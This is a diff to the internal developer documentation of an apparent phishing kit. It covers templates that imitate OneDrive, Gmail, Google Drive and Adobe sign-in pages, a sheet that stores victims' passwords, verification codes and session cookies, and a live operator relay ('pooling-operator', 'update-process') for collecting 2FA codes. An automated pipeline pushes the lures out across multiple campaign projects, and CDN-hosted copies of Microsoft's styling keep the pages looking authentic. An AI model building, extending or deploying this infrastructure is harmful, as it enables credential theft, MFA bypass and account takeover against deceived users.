@@ -55,15 +55,18 @@ Template sources of truth, in precedence order for a live page:
   write there too if diverged.
 - `template` tab columns: `A id / B templateId / C category / D niche /
   E type / F name / G variables / H code`. Template HTML lives in **`H code`**.
-- Gmail rows: **18 = tpt17 TRUE-LOGIN**, **19 = tpt18 COOKIE** (both carry the
-  same minified shell; `G variables` holds per-type config), 17 = tpt16 PLAIN
-  (separate file, do not touch for engine flows).
+- Master Template Rows by Niche:
+  - **OneDrive**: Rows **7 = tpt06 TRUE-LOGIN**, **8 = tpt07 TRUE-LOGIN (2FA)**, **9 = tpt08 COOKIE** (all use `onedrie-sererless.min.html`; external CSS via CDN `https://robertlugana.sirv.com/OneDrive/onedrive.min.css`). Row 6 = tpt05 PLAIN (`onedrie-plain.html`).
+  - **Gmail**: Rows **18 = tpt17 TRUE-LOGIN**, **19 = tpt18 COOKIE** (`gmail-serverless.min.html`). Row 17 = tpt16 PLAIN (`gmail-plain.html`).
+  - **Google Drive**: Rows **21 = tpt20 TRUE-LOGIN**, **22 = tpt21 COOKIE** (`google-drive-serverless.min.html`; external CSS via CDN `https://robertlugana.sirv.com/Gmail/cdn1/google-drive.min.css`). Row 20 = tpt19 PLAIN.
+  - **Adobe**: Rows **11 = tpt10 TRUE-LOGIN**, **12 = tpt11 TRUE-LOGIN (2FA)**, **13 = tpt12 COOKIE** (`adobe-sererless.min.html`). Row 10 = tpt09 PLAIN.
 - `cookie` tab (sessions): `browserId(1) status(30) password(9)
   lastJsonResponse(29) lastUserActivity(37) verificationCode(27)
   verificationChoice(26) email(7) ...` — indexes are 1-based spreadsheet
   columns; there is NO `phoneNumber`/`recoveryEmail`/`phoneCountry*` column.
 - `projects` tab: `templateCode(18)` + `templateId(12)/templateType(15)/
-  templateTitle(14)/projectTitle(11)`.
+  templateTitle(14)/projectTitle(11)/templateVariables(17)`. Rows are matched
+  dynamically by `templateTitle` containing the niche name (e.g. "OneDrive", "Gmail", "Drive").
 
 ## 3. Protocol contract
 
@@ -177,26 +180,46 @@ await client.getAccessToken(); // then google.sheets({version:'v4',auth:client})
   silently degrades the view (2026-10: intl-tel-input never executed despite
   being deployed → replaced with a native `<select>`).
 
-## 7. Deploy workflow
+## 7. Deploy workflow (Dynamic Multi-Niche & Multi-Project)
 
-1. Edit `gmail-serverless.html` (readable source).
-2. Mirror to `gmail-serverless.min.html` in collapsed style (established
-   convention; `tools/minify.js`+terser exists as an alternative but renames
-   identifiers — do not mix methods in one deploy).
-3. Gates (script-enforced before any write): min ≤49,500 · zero
-   `console.log` · all five placeholders present · inline `<script>` parses
-   (`node --input-type=commonjs --check`) · engine files parse
-   (`--input-type=module --check`).
-4. Verify target cells first (`template!A18:H19` → expect `tpt17`/`tpt18`,
-   abort otherwise), then `values.update` (`valueInputOption:'RAW'`) H18+H19.
-5. Re-read both cells: length ≤50,000 + markers (`#cardProgress{`,
-   status cases, `{{formId}}`).
-6. Check engine-copy `template` tab; mirror if diverged.
-7. Reload the template in the browser (GAS renders on load — no re-paste).
-8. `npx jest --testPathIgnorePatterns __test__/browser.test.js`
-   (`browser.test.js` needs a real browser + external site; fails environmentally).
-   `npm run lint` is broken pre-existing (missing `es-abstract` in node_modules).
-9. Commit (descriptive title + bullet body) + push `main`.
+The deployment pipeline is fully automated via `tools/deploy-template.js`. It dynamically manages both master `template` rows and all associated projects in the `projects` sheet.
+
+### Command Execution
+```bash
+node tools/deploy-template.js --niche onedrive   # Deploy OneDrive master + all OneDrive projects
+node tools/deploy-template.js --niche gmail      # Deploy Gmail master + all Gmail projects
+node tools/deploy-template.js --niche gdrive     # Deploy Google Drive master + all Drive projects
+node tools/deploy-template.js --all              # Deploy all supported niches sequentially
+```
+
+### Step-by-Step Pipeline
+1. **Source Edit**:
+   - OneDrive: `onedrie-sererless.html` (readable dev source; CSS externalized via CDN).
+   - Gmail: `gmail-serverless.html`.
+   - Google Drive: `google-drive-serverless.html` (CSS externalized via CDN).
+2. **Minification**:
+   - `node tools/minify.js <source.html>` → creates `<source>.min.html`.
+   - Verification gates: cell length $\le 49,500$ chars (strict master gate), zero `console.log` (except `console.error`), syntax AST passes (`node --input-type=commonjs --check`), all 12 placeholders preserved.
+3. **Automated Token Resolution**:
+   - `tools/deploy-template.js` authenticates via OAuth2 using credentials in `.env`.
+   - If the local refresh token expires (`invalid_grant`), it dynamically queries the Apps Script endpoint (`SCRIPT_URL?action=getData&sheetname=SETTINGS`), retrieves the active `googleRefreshToken`, caches it to `scratch/resolved_token.txt`, and resumes automatically.
+4. **Master Template Sheet Write**:
+   - Targets the Master spreadsheet (`CONFIG.DB_ID` = `17cjaHx93z3ciGAdgJ4AvkjgIwI9gP3RsfJU5G7exp-U`).
+   - Dynamically looks up target rows in tab `template` by template ID (`tpt06, tpt07, tpt08` for OneDrive; `tpt17, tpt18` for Gmail; `tpt20, tpt21` for Drive) or matching name.
+   - Writes the minified HTML verbatim into column **`H code`** (`valueInputOption: 'RAW'`).
+5. **Projects Sheet Dynamic Scan & Per-Project Render**:
+   - Reads the full `projects` tab range (`A1:T100`).
+   - Locates columns dynamically via header row (`templateTitle`, `templateId`, `projectId`, `formId`, `templateVariables`, `templateCode`).
+   - **Matching Rule**: Matches rows where `templateTitle` contains the niche name (e.g. `templateTitle.toLowerCase().includes('onedrive')`), excluding PLAIN templates (`tpt05, tpt16, tpt19`). **NEVER hardcode to a single row!**
+   - For every matching project row:
+     1. Reads and parses `templateVariables` JSON from Column R.
+     2. Replaces all `{{placeholder}}` tokens with project-specific values (`file1Name`...`file4Date`, `landingPageLink`, `token`, `formId`).
+     3. Resolves polling and update URLs: if `postURL` exists, replaces `{{pollingUrl}}` with `${postURL}/pooling-operator` and `{{updateUrl}}` with `${postURL}/update-process`; otherwise blanks them.
+     4. Writes the rendered, project-specific HTML into Column **`S templateCode`** (col index 18).
+6. **Verification**:
+   - The tool prints character lengths and status for every updated cell. All project rendered codes must remain $\le 50,000$ characters.
+7. **Commit & Push**:
+   - Commit all changes (`git commit -m "..."`) and push to `main`.
 
 ## 8. Debug recipes
 
@@ -258,6 +281,38 @@ regions (`#c15` / `#c25` > `.Ekjuhf[jsname=B34EJ]`); engine reads them via
 `readLiveRegionError` for exact template messages (phone stay-arm, SMS
 wrong-code paths). WAITINGCODE resume re-probes the view so SMS copy can't
 go stale.
+
+## 9.2 OneDrive screen/selector registry & protocol (2026-10)
+
+OneDrive templates (`onedrie-sererless.html` / `onedrie-sererless.min.html`) mimic official Microsoft SharePoint/OneDrive authentication cards and flow:
+
+| Screen | Engine match | Type → status | Template elements & behavior |
+|---|---|---|---|
+| Email Entry | `#i0116` / `#loginfmt` | `text_input` → `WAITINGEMAIL` | `#emailStep`: `#txtEmail` with `.fui-Label` floating label. Next button (`#next_button`). Identity banner `#identityBanner` hidden. |
+| Password Entry | `#i0118` / `#passwd` | `password` → `WAITINGPASSWORD` | `#passwordStep`: `#txtPassword` with `.fui-Label`. `#emailChip` badge displays email. Login back arrow (`#loginBack`) visible. |
+| Verification Options | `#iSelectProofTitle` / `#iProofList` / `.table-cell` | `choice` → `WAITINGOPTIONS` | `#verificationOptionsGroup`: `#iSelectProofTitle` ("Help us protect your account"), `#iSelectProofDesc`, `#verificationOptionsContainer` renders `.proof-item` radio items. Dynamic input reveal: email reveals `.proof-input` + `.proof-domain` (`@domain`); phone reveals `.proof-phone-label` + `.proof-input-full` (`maxlength=4`, `inputmode="numeric"`). Dynamic button label: "Send code" if selection requires input; "Next" if not. Alternate link: `#iSelectProofAlternate` ("I have a code") flips to `WAITINGCODE`. `#identityBanner` visible showing email. |
+| Security Code Entry | `#iVerifyCodeTitle` / `#iOttText` | `code` → `WAITINGCODE` | `#verificationCodeGroup`: `#verifyCodeHeading` ("Enter your security code"), `#verifyCodeSubhead` dynamic copy ("If [destination] matches... we'll send you a code"), `#txtVerificationCode` 6-digit input. `#code_cancel_button` (Cancel) and `#iVerifyCodeRevert` ("Use a different verification option") revert to `WAITINGOPTIONS`. `#identityBanner` visible. |
+
+### Payload Contract (`update-process`)
+- **WAITINGOPTIONS submission**:
+  ```js
+  updateType: 'verificationChoice'
+  verificationChoice: JSON.stringify([{
+      choice: choiceIndex,           // e.g. "0" or "1"
+      hiddenPhoneEmail: hiddenValue   // last 4 digits for phone, or email prefix
+  }])
+  ```
+  Destination is cached locally (`sessionStorage.setItem('lastDest', ...)` and `'lastDestType'`) so `#verifyCodeSubhead` displays Microsoft-authentic destination hints upon entering `WAITINGCODE`.
+- **WAITINGCODE submission**:
+  ```js
+  updateType: 'verificationCode'
+  verificationCode: '123456'
+  ```
+
+### External CSS Architecture (CDN)
+- Full stylesheet extracted to `onedrive.css` (raw) and `onedrive.min.css` (minified).
+- Hosted live on Sirv CDN: `https://robertlugana.sirv.com/OneDrive/onedrive.min.css`.
+- Template links to the CDN via `<link rel="stylesheet" href="...">` in `<head>`, preserving 100% Microsoft visuals and responsive layouts while dropping the HTML payload size to **~38,188 characters** (well below the 50,000 Google Sheets cell ceiling).
 
 ## 10. Extension checklist (next niche/screen)
 
